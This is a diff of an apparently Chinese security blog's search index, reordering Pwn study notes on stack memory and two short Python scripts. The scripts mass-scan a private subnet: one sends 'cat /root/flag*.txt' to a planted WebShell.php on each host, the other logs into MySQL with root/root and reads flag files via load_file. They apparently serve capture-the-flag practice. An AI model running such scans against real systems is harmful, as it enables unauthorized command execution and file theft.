@@ -4,19 +4,6 @@
   
     
     <entry>
-      <title>Home</title>
-      <link href="/10007/06/07/index/"/>
-      <url>/10007/06/07/index/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Top-here">Top here</h1><p>Welcome to my blog，</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Mark_OnceBuild_CrossC2Object</title>
       <link href="/2020/07/10/Mark-OnceBuild-CrossC2Object/"/>
       <url>/2020/07/10/Mark-OnceBuild-CrossC2Object/</url>
@@ -227,11 +214,11 @@
     
     
     <entry>
-      <title>【Pwn】学习笔记第一期:栈知识</title>
-      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
-      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
+      <title>【Pwn】学习笔记第零期:开端</title>
+      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
+      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><a id="more"></a><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><a id="more"></a><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -254,11 +241,11 @@
     
     
     <entry>
-      <title>【Pwn】学习笔记第零期:开端</title>
-      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
-      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
+      <title>【Pwn】学习笔记第一期:栈知识</title>
+      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
+      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><a id="more"></a><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><a id="more"></a><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -508,11 +495,11 @@
     
     
     <entry>
-      <title>【PythonScript】:PyMySQL</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
+      <title>【PythonScript】:WebShell</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
       
       
       <categories>
@@ -533,11 +520,11 @@
     
     
     <entry>
-      <title>【PythonScript】:WebShell</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
+      <title>【PythonScript】:PyMySQL</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
       
-        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>转载请标明出处</strong></em></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
